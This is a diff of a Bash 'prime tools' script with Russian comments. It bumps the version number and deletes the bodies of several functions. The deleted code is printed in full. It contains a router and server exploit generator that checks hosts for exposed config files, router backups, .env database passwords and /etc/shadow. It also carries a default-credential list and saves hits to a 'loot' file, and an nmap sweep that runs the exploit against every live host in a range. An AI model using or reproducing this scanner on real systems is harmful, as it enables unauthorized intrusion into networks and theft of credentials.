@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="32.9"
+CURRENT_VERSION="33.0"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -839,17 +839,7 @@ EOF
 }
 
 generate_cert_reader_tool() {
-    local target_file="$1"
-    # Записываем скрипт, экранируя все переменные
-    cat << 'EOF' > "$target_file"
-#!/bin/bash
-FILE="$1"
-if [ ! -f "$FILE" ]; then echo "Error: File not found"; exit 1; fi
-echo ">> ANALYZING CERTIFICATE: $FILE"
-# Прямой вызов без вложенных функций для стабильности
-openssl x509 -in "$FILE" -noout -subject -issuer -dates
-EOF
-    chmod +x "$target_file"
+   
 }
 
 
@@ -881,14 +871,7 @@ run_cert_reader() {
 
 # 3. Исправленный ГЕНЕРАТОР ПАРОЛЕЙ (Линия 972 - ФАТАЛЬНАЯ ОШИБКА)
 run_pwd_gen() {
-    clear
-    echo -e "\e[1;32m[PRIME PASSWORD GENERATOR]\e[0m"
-    read -p "ENTER LENGTH: " P_LEN
-    P_LEN=${P_LEN:-24}
-    # Убрали сложные токены, используем максимально простой синтаксис
-    NEW_KEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w "$P_LEN" | head -n 1)
-    echo -e "\e[1;32mNEW PASSWORD: $NEW_KEY\e[0m"
-    read -p "PRESS ENTER"
+    
 }
 
    run_cert_forge() {
@@ -909,57 +892,14 @@ run_pwd_gen() {
 
 # 1. Исправленный ГЕНЕРАТОР ЭКСПЛОЙТА (Линии 957, 991, 997)
 generate_prime_ultimate_exploiter_v4() {
-    local target_file="$1"
-    cat << 'EOF' > "$target_file"
-#!/bin/bash
-TARGET="$1"
-UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-V_LIST=("/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/.env:DB_PASSWORD" "/etc/shadow:root:")
-C_LIST=("admin:admin" "admin:password" "root:root" "telecomadmin:admintelecom")
-
-for proto in "http" "https"; do
-    BASE="${proto}://${TARGET}"
-    # Используем grep вместо сложного awk для совместимости
-    H=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$BASE/" 2>/dev/null | head -n1)
-    CODE=$(echo "$H" | grep -oE '[0-9]{3}' | head -n1)
-    [ -z "$CODE" ] && CODE="000"
-
-    if [[ "$CODE" == "200" || "$CODE" == "401" || "$CODE" == "302" ]]; then
-        echo -e "\e[1;34m[*] $BASE [$CODE]\e[0m"
-        for item in "${V_LIST[@]}"; do
-            VP=$(echo "$item" | cut -d':' -f1)
-            VK=$(echo "$item" | cut -d':' -f2)
-            if curl -sL -k -A "$UA" --max-time 3 "$BASE$VP" 2>/dev/null | grep -q "$VK"; then
-                echo -e "    \e[1;31m[!!!] EXPLOIT SUCCESS: $VK\e[0m"
-                echo "[EXPL] $BASE$VP" >> /root/prime_loot_full.txt
-            fi
-        done
-    fi
-done
-EOF
-    chmod +x "$target_file"
+    
 }
 
 
 
 # 2. Исправленный СКАНЕР СЕТИ (Линии 1014, 1031)
 run_heuristic_router_scan() {
-    clear
-    echo -e "\e[1;32m[PRIME HEURISTIC SCANNER v2]\e[0m"
-    read -p "ENTER TARGET (IP/Range): " H_TARGET
-    echo -e "\e[1;34m[*] Detecting active nodes...\e[0m"
-    # Упрощенный парсинг nmap без капризного awk
-    NODES=$(nmap -n -sn "$H_TARGET" | grep "report for" | cut -d' ' -f5)
     
-    if [ -z "$NODES" ]; then
-        echo -e "\e[1;31m[!] No nodes found.\e[0m"
-        return
-    fi
-    
-    for IP in $NODES; do
-        generate_prime_ultimate_exploiter_v4 "/tmp/scanner_exec"
-        bash "/tmp/scanner_exec" "$IP"
-    done
 }
 
 run_view_loot() {
